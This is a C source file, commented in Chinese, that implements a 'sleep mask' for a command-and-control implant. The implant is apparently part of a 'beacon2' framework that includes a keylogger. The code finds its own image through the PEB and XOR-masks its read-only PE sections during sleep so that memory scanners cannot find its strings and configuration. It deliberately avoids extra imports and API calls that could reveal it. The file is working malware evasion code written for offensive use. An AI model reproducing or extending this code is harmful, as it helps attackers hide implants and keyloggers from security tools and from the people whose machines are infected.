/*
 * csdev :: sleepmask2.c  --  自包含 Sleep Mask 实现
 * ==========================================================================
 * 目标: 休眠窗口内让内存扫描/内存转储**拿不到有效字符串与配置**。
 *
 * 做法: 遍历自身 PE 的节表, 对**不含 IMAGE_SCN_MEM_EXECUTE** 的节
 *       (.rdata/.data/.bss 等) 逐字节异或一条确定性密钥流。
 *
 * 三条硬约束 (违反任一条都会让植入体崩溃或失效):
 *   1. **绝不掩码可执行节**。密钥流是自逆的, 但"执行加密后的机器码"没有意义。
 *   2. **密钥流必须确定性**。掩码与还原是两次独立调用, 两次必须生成同一条流,
 *      所以不能用随机数或随时间变化的种子。
 *   3. **键盘记录运行时不掩码**。那条线程会访问全局缓冲, 掩码会让它读到垃圾。
 *
 * 不新增静态导入: 只用 VirtualProtect / VirtualQuery (KERNEL32, 已在导入表)。
 * ==========================================================================
 */
#include <windows.h>

#include "sleepmask2.h"

/* ---------------------------------------------------------------- 工具 */

static unsigned long long sm_gs_base(void)
{
    unsigned long long v;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(v));
    return v;
}

/* 从 PEB 取自身映像基址 (不调用 GetModuleHandle, 避免自读取行为链) */
static unsigned char *sm_image_base(void)
{
    unsigned char *peb = (unsigned char *)(unsigned long long)sm_gs_base();
    if (!peb) return NULL;
    return *(unsigned char **)(peb + 0x10);   /* PEB->ImageBaseAddress */
}

/* 确定性密钥流: 与偏移相关, 与时间无关 */
static unsigned char sm_stream(unsigned int i)
{
    unsigned int x = i * 2654435761u;
    x ^= (x >> 15);
    x *= 2246822519u;
    x ^= (x >> 13);
    x *= 3266489917u;
    x ^= (x >> 16);
    return (unsigned char)(x & 0xFF);
}

/* ---------------------------------------------------------------- 掩码 */

/* 键盘记录运行标志由 beacon2_ops.c 提供 (ops_keylog_peek 返回非 0 即活跃)。
 * 这里不做符号依赖, 改用一个弱约定: 由 beacon2.c 注入回调。 */
static int (*g_busy_hook)(void) = NULL;

/* beacon2.c 在初始化时注入: 返回非 0 表示当前有不允许掩码的后台活动 */
void smask_set_busy_hook(int (*fn)(void))
{
    g_busy_hook = fn;
}

static int smask_walk(int encrypt)
{
    unsigned char *base = sm_image_base();
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_SECTION_HEADER *sec;
    int i, touched = 0;

    if (!base) return 0;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != 0x5A4D) return 0;             /* "MZ" */
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;        /* "PE\0\0" */
    if (nt->FileHeader.NumberOfSections == 0 ||
        nt->FileHeader.NumberOfSections > 96) return 0;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        unsigned int n, j;
        unsigned char *p;
        DWORD old = 0, tmp = 0;

        /* 约束 1: 可执行节一律跳过 */
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) continue;
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_READ)) continue;

        /* 只掩码**纯只读常量节** (.rdata 这类, 硬编码字符串与配置都在这里)。
         * 绝不掩码可写节 (.data/.bss): 它们装的是运行时状态 —— 会话密钥、
         * 缓冲指针、动态解析出的 API 表。实测掩码它们会让植入体上线后
         * **所有命令静默无回传** (唤醒后虽然还原, 但还原前的任何路径都可能
         * 读到垃圾)。这是 sleep mask 的经典边界, 收益也足够: 内存扫描命中的
         * 是字符串与配置, 不是堆上的运行时指针。 */
        if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) continue;

        n = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (n == 0 || n > (64u << 20)) continue;

        p = base + sec[i].VirtualAddress;

        if (!VirtualProtect(p, n, PAGE_READWRITE, &old)) continue;
        {
            for (j = 0; j < n; j++) {
                p[j] = (unsigned char)(p[j] ^ sm_stream(j));
            }
        }
        /* 还原为可读 (掩码期间不需要写权限; 唤醒后再改回原权限) */
        VirtualProtect(p, n, encrypt ? PAGE_READONLY : old, &tmp);
        touched++;
    }
    return touched;
}

int smask_begin(void)
{
    /* 约束 3: 有不允许掩码的后台活动时直接跳过 */
    if (g_busy_hook && g_busy_hook()) return 0;
    return smask_walk(1) > 0 ? 1 : 0;
}

void smask_end(void)
{
    smask_walk(0);
}

/* ---------------------------------------------------------------- 自测 */

/* 对给定缓冲做一次掩码往返。注意: 用与 walk 相同的密钥流, 但作用在外部缓冲上,
 * 因此只验证"流自逆"这一性质, 不触碰真实映像。 */
int smask_selftest(void)
{
    unsigned char buf[512];
    unsigned char orig[512];
    unsigned int i;

    for (i = 0; i < sizeof(buf); i++) {
        buf[i] = (unsigned char)(i * 7 + 3);
        orig[i] = buf[i];
    }
    for (i = 0; i < sizeof(buf); i++) buf[i] = (unsigned char)(buf[i] ^ sm_stream(i));
    {
        int changed = 0;
        for (i = 0; i < sizeof(buf); i++) if (buf[i] != orig[i]) { changed = 1; break; }
        if (!changed) return 0;                   /* 掩码没起作用 */
    }
    for (i = 0; i < sizeof(buf); i++) buf[i] = (unsigned char)(buf[i] ^ sm_stream(i));
    for (i = 0; i < sizeof(buf); i++) if (buf[i] != orig[i]) return 0;
    return 1;
}
